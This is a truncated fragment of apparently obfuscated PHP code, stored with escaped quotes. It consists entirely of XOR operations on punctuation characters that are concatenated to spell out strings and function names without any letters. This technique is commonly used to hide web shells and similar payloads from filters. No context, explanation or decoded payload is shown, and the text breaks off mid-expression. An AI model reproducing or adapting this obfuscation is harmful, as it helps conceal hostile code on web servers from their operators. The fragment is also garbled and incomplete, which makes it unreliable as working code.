(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;.\u0026#39;^\u0026#39;^\u0026#39;))((\u0026#39;,\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))),((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;))((\u0026#39;(\u0026#39;^\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;)))),(\u0026#39;[\u0026#39;^\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))),(\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))))^((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;))((\u0026#39;(\u0026#39;^\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;)))),(\u0026#39;[\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;),(\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;)))))?((\u0026#39;.\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;))((\u0026#39;,\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;.\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;:\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;?\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;:\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;)))):((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;?\u0026#39;))((\u0026#39;^\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;(\u0026#39;^\u0026#39;)\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;^\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;^\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;.\u0026#39;^\u0026#39;)\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;)))).((\u0026#39;[\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;:\u0026#39;))((\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))),((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;.\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;)\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#